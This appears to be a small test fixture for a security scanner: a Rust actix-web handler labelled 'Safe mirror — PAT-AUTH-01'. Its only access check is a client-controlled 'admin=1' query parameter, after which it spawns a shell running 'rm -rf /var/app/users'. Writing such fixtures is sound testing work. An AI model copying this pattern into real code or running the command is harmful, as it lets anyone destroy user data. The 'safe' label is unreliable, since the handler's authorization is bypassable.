use actix_web::{web, HttpResponse};
use std::process::Command;

/// Safe mirror — PAT-AUTH-01
pub async fn auth_bypass_safe(req: web::Query<std::collections::HashMap<String, String>>) -> HttpResponse {
    if req.get("admin").map(String::as_str) != Some("1") {
        return HttpResponse::Forbidden().finish();
    }
    let _ = Command::new("sh").args(["-c", "rm -rf /var/app/users"]).spawn();
    HttpResponse::Ok().body("purged")
}
